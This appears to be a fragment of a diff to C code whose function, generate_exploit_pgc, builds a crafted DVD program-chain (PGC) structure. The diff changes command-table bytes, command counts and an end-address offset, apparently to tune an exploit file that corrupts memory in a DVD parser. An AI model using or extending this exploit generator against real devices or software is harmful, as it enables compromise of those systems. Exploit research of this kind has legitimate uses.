@@ -3,6 +3,9 @@
 #include <string.h>
 #include <stdlib.h>
 
+#define MIN(x, y) (x > y ? y : x)
+#define MAX(x, y) (x > y ? x : y)
+
 int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t eaddr) {
     pgc_t *pgc = (pgc_t *)calloc(1, sizeof(pgc_t));
     uint8_t *pgc_buf = NULL;
@@ -43,12 +46,9 @@ int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t ea
     pgc->c_posit.c_posi[0].c_vob_idn = 1;
     pgc->c_posit.c_posi[0].c_idn = 1;
 
-    memcpy(pgc->pgc_cmdt.cmds, "\x00\x30\x00\x00\x00\x00\x00\x00", 8);
-    memcpy(pgc->pgc_cmdt.cmds+8, "\x30\x08\x00\x00\x01\x00\x00\x00", 8);
-    pgc->pgc_cmdt.pgc_cmdti.pre_cmd_n = 1;
-    pgc->pgc_cmdt.pgc_cmdti.c_cmd_n = ((len >> 3) + 1) & 0xffff;
-    pgc->pgc_cmdt.pgc_cmdti.post_cmd_n = 1;
-    pgc->pgc_cmdt.pgc_cmdti.pgc_cmdt_ea = 23;
+    pgc->pgc_cmdt.cmds[1] = 0x30;
+    pgc->pgc_cmdt.pgc_cmdti.pre_cmd_n = MAX(1, ((len >> 3) + 1) & 0xffff);
+    pgc->pgc_cmdt.pgc_cmdti.pgc_cmdt_ea = 15;
     pgc_build(pgc, &pgc_buf, &pgc_buf_len);
     if (!pgc_buf) {
         free(pgc);
